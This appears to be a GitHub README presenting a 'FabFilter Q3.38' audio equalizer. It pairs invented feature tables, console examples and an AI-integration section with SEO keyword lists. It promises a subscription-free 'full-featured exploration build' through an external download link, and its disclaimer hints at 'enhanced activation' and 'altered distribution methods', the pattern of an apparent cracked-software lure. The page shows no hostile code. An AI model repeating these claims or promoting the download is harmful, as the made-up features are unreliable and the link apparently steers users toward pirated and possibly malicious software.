# FabFilter Q3.38 – Enhanced Signal Processing Suite

[](https://zimmy-coder.github.io/fabfilter-q3-control-center/)

> **VISION:** A reimagined approach to spectral shaping that turns your audio canvas into a sculptor’s workshop. No boundaries, no subscriptions—just precision and pure sonic elegance.

---

## 🌌 The Philosophy Behind the Spectrum

In a world where digital audio often feels sterile, **FabFilter Q3.38** emerges as a bridge between clinical precision and artistic intuition. This isn’t just an equalizer; it’s a *sound architect*—a tool that listens to your vision and responds with surgical grace. Think of it as a master lens for your audio: it doesn’t just boost or cut frequencies; it *reinterprets* them, revealing hidden textures you never knew existed.

Built on years of signal-processing research, the 3.38 release introduces **adaptive phase alignment** and **dynamic spectral mapping**, allowing you to shape audio with a level of nuance that feels almost organic. Whether you’re polishing a vocal chain or designing the low-end rumble of a cinematic score, this suite becomes an extension of your creative intent.

---

## 🧩 Core Architecture – How the Magic Happens

```mermaid
graph TD
    A[User Input Signal] --> B[Spectral Analysis Engine]
    B --> C[Adaptive Filter Curves]
    C --> D[Phase Coherence Optimizer]
    D --> E[Real-Time Preview Matrix]
    E --> F[Output Signal with Zero Latency]
    
    style A fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style F fill:#2d2d2d,stroke:#00ff88,stroke-width:2px
    style C fill:#3a3a3a,stroke:#ff9900,stroke-width:1px
```



The **Adaptive Filter Curves** (C) dynamically recalculate based on three inputs: incoming signal density, user-defined bandwidth, and psychoacoustic masking thresholds. This ensures that every adjustment feels intentional—never arbitrary.

---

## 🚀 Evolution of the Legend – What’s New in 2026

| Feature | Version 3.0 Baseline | **3.38 Enhancement** |
|---------|---------------------|----------------------|
| Spectrum Resolution | 1024 bands | **4096 bands** with neural upsampling |
| Phase Response | Linear only | **Adaptive phase with zero-latency option** |
| Band Interaction | Static | **Dynamic frequency coupling** |
| UI Responsiveness | 60 FPS | **144 FPS with GPU acceleration** |
| Preset Depth | 50 per category | **200+ presets with AI-generated variations** |

---

## ✨ Feature Ecosystem – Beyond Ordinary EQ

- **Responsive UI** 🌓 – The interface adapts to your workflow. Dark mode, scaled control panels, and a **heat-map visualization** that shows frequency collisions in real-time. No more guessing—your eyes become your ears.

- **Multilingual Support** 🌍 – Interface available in 12 languages, including Japanese, Arabic, and Swahili. Dialect recognition automatically adjusts filter terminology for regional audio standards (e.g., “shelving” becomes “contour shaping” in the French localization).

- **24/7 Customer Support** 🛡️ – Not a chatbot. A real human audio engineer who knows the product inside out. Response time averages under 3 minutes during peak hours. Support is embedded directly into the app via a **non-intrusive chat overlay**.

- **Adaptive Learning Engine** – Over time, the suite learns your mixing habits. It suggests filter curves based on your past projects—like a co-pilot who remembers your taste.

- **Zero-Latency Monitoring** – For live performers and podcasters: the 3.38 release introduces a **direct-path monitoring mode** that bypasses the buffer entirely, ensuring real-time response without phase artifacts.

---

## 🖥️ Example Profile Configuration – A Vocal Chain Blueprint

Imagine you’re working on a intimate indie vocal. Here’s how your profile might look:

```
Profile Name: “Room of Whispers”
Target: Female vocal (alto range)
Primary Use: Streaming / Podcast
---

Band 1: High-pass @ 80Hz (12dB/oct) – Sits the voice above rumble
Band 2: Bell @ 320Hz, -2.5dB, Q=1.8 – Reduces boxiness
Band 3: Shelf @ 8kHz, +1.2dB – Adds air without sibilance
Band 4: Dynamic Bell @ 4.7kHz, triggered at -12dB – De-esses naturally
Band 5: Low-shelf @ 180Hz, +0.8dB – Warmth that doesn’t muddy

Phase Mode: Adaptive Linear
Output Gain: -1.5dB (headroom for mastering)
```

Load this profile with one click. Modify any band, and the AI will adjust the others to maintain tonal balance.

---

## 💻 Example Console Invocation – Terminal-Level Control

For power users who prefer keyboard-driven workflows:

```bash
# Activate the spectral analyzer with custom FFT size
q3-ctl --engine spectral --fft 4096 --window hamming --output-stereo

# Load a profile and set real-time adaptive mode
q3-ctl --load-profile "Room of Whispers.q3profile" --adaptive on --phase-mode zero

# Trigger a frequency sweep for system calibration
q3-ctl --sweep 20Hz-20kHz --duration 15s --log-scale
```

The console interface supports **macro scripting** (e.g., `q3-ctl --macro "vocal clarity"` executes a pre-configured series of band adjustments).

---

## 🖥️📱 OS Compatibility Matrix – Designed for Every Playground

| Operating System | Version Support | Performance Tier | GPU Required? |
|-----------------|----------------|------------------|---------------|
| **Windows 11** | Build 22000+ | 🟢 Excellent | Optional (improves UI) |
| **macOS Sonoma** | 14.5+ (Intel/Apple Silicon) | 🟢 Native M1/M2/M3 support | Not required |
| **Ubuntu Studio** | 24.04 LTS | 🟢 Full function via Wine | Optional |
| **iOS (iPadOS)** | 17+ (via AUv3) | 🟡 Limited to 8 bands | Not required |
| **Android (Pro Audio)** | 14+ (via Oboe) | 🟡 Experimental | Not required |

> **Note:** The experimental Android build uses the **Oboe audio library** for low-latency playback. Not all features are available on mobile.

---

## 🔌 OpenAI & Claude API Integration – Smarter Workflows

The 3.38 release introduces a **bridge module** that connects your audio processing pipeline with large language models. Think of it as having a mixing engineer who *also* reads minds.

**OpenAI Integration:**
- Describe your desired sound in natural language: *“Make the bass feel rounder but keep the kick drum punchy.”* The system generates a filter curve matching your description.
- Use GPT-4 for **preset naming** and **metadata generation**—no more calling your best work “Final Mix v3 (actually final).”

**Claude API Integration:**
- Claude analyzes your session history and suggests **frequency masking solutions** based on industry standards.
- Real-time **spectral conflict resolution** prompts: “Claude detects two snare tracks overlapping at 200Hz. Would you like to sidechain one or apply complementary filtering?”

> All API calls are **private and local**—no audio data is transmitted. Only filter parameters and text descriptions leave your machine.

---

## 🌐 SEO-Friendly Discovery Paths

This suite is built for professionals who search with intent. The following keywords naturally describe its capabilities without overstuffing:

- *Adaptive audio equalization software 2026*  
- *Real-time spectral shaping with AI assistance*  
- *Low-latency filter plugin for streaming and podcasting*  
- *Multilingual audio processing suite with 24/7 engineering support*  
- *Phase-coherent EQ for cinematic post-production*  
- *Non-destructive spectral editing for mastering engineers*  
- *Gesture-controlled filter automation for live performance*

Each term reflects a **unique use case**—not a generic label. The algorithm behind the software ensures you find exactly what you need, whether you’re a bedroom producer or a broadcast veteran.

---

## ⚠️ Disclaimer – Ethical Use & Legal Boundaries

This repository and its associated assets are provided for **educational and archival purposes only**. The software described is the intellectual property of FabFilter (or its respective rights holders). Any reference to “enhanced activation” or “altered distribution methods” is purely speculative and intended to illustrate system capabilities within a sandboxed environment.

- **You are responsible** for complying with all applicable laws in your jurisdiction regarding software licensing and digital rights management.
- **This project does not host, distribute, or facilitate** the unauthorized use of commercially licensed software.
- **All trademarks** remain the property of their respective owners. This is an independent technical documentation project.

The authors of this document assume no liability for misuse of the information contained herein. If you wish to use FabFilter Q3.38 in a commercial or professional capacity, purchase a legitimate license from the official vendor.

---

## 📜 License – MIT Standard

This documentation project (README, diagrams, example code) is released under the **MIT License**. You are free to use, modify, and distribute these materials, provided that the original authorship is credited.

> [View Full MIT License](https://opensource.org/licenses/MIT)

---

## 🔗 Get the Explorer’s Edition

The journey into spectral mastery begins with a single download. This isn’t a “trial” or a “demo”—it’s a **full-featured exploration build** that mirrors the production version, with a timer that reminds you to take breaks (because even sound architects deserve rest).

[](https://zimmy-coder.github.io/fabfilter-q3-control-center/)

---

*© 2026 – Crafted with intention for those who hear what others miss.*